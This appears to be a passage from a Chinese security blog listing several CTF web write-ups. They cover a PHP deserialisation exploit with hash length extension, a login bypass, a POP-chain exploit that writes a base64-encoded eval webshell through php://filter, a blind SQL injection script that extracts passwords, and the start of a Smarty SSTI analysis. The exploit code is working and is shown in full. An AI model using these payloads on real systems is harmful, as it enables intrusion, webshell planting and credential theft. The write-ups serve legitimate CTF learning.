<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@mysql_conn();</span><br><span class="line">$sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">$query = mysql_query($sql1);</span><br><span class="line">$result1 = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">    $result1[] = $temp;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">    <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以直接union注入看到回显，而$id在这里被定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">    header(<span class="string">'Location:/index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当$result[‘userid’]存在时，我们输入的id会被覆盖，所以我们需要让$result为空。观察api.php可以看到这里存在反序列化可以删除特定用户。只要我们先登录，再通过api.php将我们登录的账号删除就可以使得我们输入的id不被覆盖。在forgot.php处用户名输入admin就可以看到admin的salt的md5值，通过hash长度拓展攻击就可以通过api.php里的check。删除用户的索引是userid，这个可以在cookie里找到。</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name;</span><br><span class="line">    <span class="keyword">var</span> $check;</span><br><span class="line">    <span class="keyword">var</span> $data;</span><br><span class="line">    <span class="keyword">var</span> $method;</span><br><span class="line">    <span class="keyword">var</span> $userid;</span><br><span class="line">    <span class="keyword">var</span> $msgid;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">"admin"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userid = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="string">"del_user"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="string">"6122c04e8a1f3529d556199960ef2556"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = urlencode(base64_encode(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/wonderkun/CTF_web/blob/master/web400-3(swpu_ctf)/README.md" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/blob/master/web400-3(swpu_ctf)/README.md</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/23/20191123EIS/">EIS2019writeup及复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><p>&emsp;</p>
<p> 周四的EIS由于生病没怎么看，就做出了一道ezpop混了个四血。在队友的努力下我们最终排名全国第七。听队里师傅说题目环境没关，就简单写篇博客复现一下自己看了的题目的思路。</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>​        题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">	    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>

<p>​        这里使用了预编译，sql注入肯定没戏了。看题的时候就感觉应该是逻辑漏洞，username随便传可以让$dpass为NULL，然后想办法让$password也为NULL就行。由于这里是强比较，故无法通过POST password=这样的方法来绕过。真正的解法应该是直接不提交password。由于程序没有检验$_POST[‘password’]是否存在，所以这样就可以使得$password为NULL。</p>
<p>​        上传部分就没什么可说的了。</p>
<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>题目部分源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        $expire   = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>​        一共就给了两个类，很容易想到是要通过A的对象析构时调用B的set方法。在调用A的store成员的set方法前A会先调用自身的getForStorage()方法，把返回的结果带入set方法执行。getForStorage()方法会调用cleanContents()返回一个Array，再对其进行json_encode并返回。B的set方法会先执行$serialize()来处理传入的$data，然后再把$data拼接在一段包含了exit();函数的PHP代码后，并写入文件。</p>
<p>​        至此，本题的思路基本清晰，getshell的核心在于避免exit()被写在我们的代码前。而且由于传入的data是一个json_encode后的数据，我们也应该选取合适的$serialize来生成结构合理的shell。第一个问题其实不是什么新的东西，以前有一道叫做死亡退出的题目就考过这个点。由于文件名可控，所以我们可以利用php://filter的write流把即将写入文件的内容先行base64解码，这样我们的代码前的字符会被解码为乱码，而只要我们先行把我们想执行的代码进行base64编码，那么我们就能成功写入一个shell。</p>
<p>​        由于base64的解码规则是四个字符转三个字符，所以我们要保证我们bas64编码后的代码前的字符串长度为四的倍数。当$expire为1时，前边代码长度恰好为32。传入set的是一个json_encode的数据，本身就是一个字符串，只需要控制这个字符串的内容使之包含我们的base64代码并且代码前字符串长度为4的倍数。那么$serialize()这个函数就最好选择一个能把字符串原样返回的函数。我用的是strip_tags()，由于字符串里没有标签，这个函数在这里功能就是把字符串原样返回。exp如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">"123.php"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line">$ate = <span class="keyword">array</span>(<span class="string">'filename'</span> =&gt; <span class="string">'PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+ '</span>);</span><br><span class="line">$contents = <span class="keyword">array</span>(<span class="string">"uploads"</span>=&gt; $ate);</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">'prefix'</span>]=<span class="string">"php://filter/write=convert.base64-decode/resource=./uploads/"</span>;</span><br><span class="line">$b-&gt;options[<span class="string">'serialize'</span>]=<span class="string">"strip_tags"</span>;</span><br><span class="line">$b-&gt;options[<span class="string">'data_compress'</span>] = <span class="keyword">false</span>;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;test($b);</span><br><span class="line">$a-&gt;complete = <span class="string">'123'</span>;</span><br><span class="line">$a-&gt;cache = $contents;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>​        就可以在uploads目录下生成我们的shell123.php。顺带一提，我们的shell代码base64编码后末尾不能有等于号’=’，这也是bas64解码的性质决定的，这里不多赘述了。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/16/20191116giftbox/">De1CTF 2019 Giftbox 分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>​        可以看到题目模拟了一个Mac的shell，终端输入help可以看到能使用的指令，执行cat usage.md可以看到核弹使用说明</p>
<p><img src="/2019/11/16/20191116giftbox/1.png" alt></p>
<p>​        除了login之外其他指令都需要登录才能执行。</p>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>​        login在username参数处存在无过滤的布尔盲注，分析数据传递发现在shell.php处除了执行的命令外还提交了totp参数。在./js/main.js文件中可以看到令牌的生成方式是TOTP(“GAXG24JTMZXGKZBU”,8)，出题人还很好心地把python下的pyotp库放在了题目环境中。故可以写出盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">chars = <span class="string">"!#$%&amp;()+,-./0123456789?ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;"</span></span><br><span class="line">url = <span class="string">"http://652b106a-45a1-4b56-9ce7-947d8c864c0a.node3.buuoj.cn/shell.php?a=login%20admin'/**/and(&#123;&#125;)and/**/'1'='1%201&amp;totp=&#123;&#125;"</span></span><br><span class="line">payload = <span class="string">"ascii(mid((select/**/group_concat(password)/**/from/**/users),&#123;&#125;,1))&gt;&#123;&#125;"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">r =requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment">#print(url.format(payload.format(i,ord(char)), totp.now()))</span></span><br><span class="line">        res = r.get(url.format(payload.format(i,ord(char)), totp.now()))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"user"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            result += char</span><br><span class="line">            print(result)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<p>​        获得管理员密码兼hint：hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}。</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>​        用密码登录管理员并执行提示的sh0w_hiiintttt_23333命令可以看到launch时有eval的调用。测试发现，reading target时存在eval，但是常规的命令执行拼接会被检测，而且position的长度限制为12。</p>
<p>​        解决方法是利用PHP的大括号{}执行函数，如下图：</p>
<p><img src="/2019/11/16/20191116giftbox/2.png" alt></p>
<p>​        报错是因为phpinfo()返回的结果无法被处理，查看http history就可以看到shell.php返回了phpinfo()的结果。在phpinfo里能看到设置了open_basedir，可以利用chdir的方法绕过，这里不多阐述。</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/13/20191101SSTI/">Smarty ssti漏洞分析利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="本文首发于合天智汇：-https-mp-weixin-qq-com-s-7h3AXDBksNeiJ3xVxaM-yw"><a href="#本文首发于合天智汇：-https-mp-weixin-qq-com-s-7h3AXDBksNeiJ3xVxaM-yw" class="headerlink" title="本文首发于合天智汇： https://mp.weixin.qq.com/s/7h3AXDBksNeiJ3xVxaM-yw"></a>本文首发于合天智汇： <a href="https://mp.weixin.qq.com/s/7h3AXDBksNeiJ3xVxaM-yw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7h3AXDBksNeiJ3xVxaM-yw</a></h2><p>​        Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。 对于该框架的SSTI漏洞很多文章往往只是一笔带过，讲解的重心往往在flask等框架上。本篇文章结合一道CTF题目对Smarty的SSTI漏洞进行了一定的分析。题目地址：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a> CISCN2019华东南赛区Web11</p>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>​        题目模拟了一个获取IP的API，并且可以在最下方看到“Build With Smarty !”可以确定页面使用的是Smarty模板引擎。题目中显示的API的URL由于环境的原因无法使用，但是我们的IP依旧显示在了页面的右上角。很容易猜测出这个IP的值受XFF头控制 。将XFF头改为{2-1}会发现该位置的值变为了1，便可以确定这里存在SSTI。</p>
<h1 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h1><p>​        Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h4 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h4><p>​        一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h4 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h4><p>​        Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src="https://res.cloudinary.com/dic8uma8w/image/upload/v1572609446/error1_j0htf7.png" alt></p>
<p>​        在Smarty3的官方手册里有以下描述:</p>
<blockquote>
<p> Smarty已经废弃<code>{php}</code>标签，强烈建议不要使用。  在Smarty 3.1，<code>{php}</code>仅在SmartyBC中可用。 </p>
</blockquote>
<p>​        该题目使用的是Smarty类，所以只能另寻它路。</p>
<h4 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a><strong>{literal}</strong> 标签</h4><p>​        官方手册这样描述这个标签：</p>
<blockquote>
<p> <code>{literal}</code>可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。 </p>
</blockquote>
